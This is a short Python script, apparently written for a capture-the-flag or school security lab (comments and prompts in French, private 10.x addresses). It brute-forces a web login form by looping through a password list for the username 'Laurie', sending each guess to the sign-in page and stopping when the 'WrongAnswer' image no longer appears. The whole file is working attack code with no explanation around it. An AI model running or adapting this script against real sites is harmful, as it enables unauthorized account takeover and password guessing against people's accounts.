import requests
import re
import time

#r = requests.get('http://10.12.1.150/?page=signin')

#print(r)
#print(r.content)


url_input = raw_input("Url du site(ex: 10.12.1.115): ")

total = 0
debut = time.time()
print("Running ...")
with open('password_list.txt') as file:
    tmppwd = file.readlines()
for pwd in tmppwd:
    if time.time() - debut > 30:
        total = total + (time.time() - debut)
        debut = time.time()
        print("%.3f sec" % total)
    pwd = pwd.rstrip()
    payload = {'username': 'Laurie', 'password': pwd, 'Login': 'login'}
    try:
        r = requests.get('http://' + url_input +  '/?page=signin', params=payload)
    except:
        print("  !!! L'url n'a pas l'air bonne !!!")
        exit()
    find = re.search('<img src="images/WrongAnswer.gif" alt="">', r.content)
    if find is None:
        print(">>>>>>>>> " + pwd + " <<<<<<<<<<<")
        print("%.3f" % (total + (time.time() - debut)) + " sec")
        break
    else:
        print("[-] " + pwd)


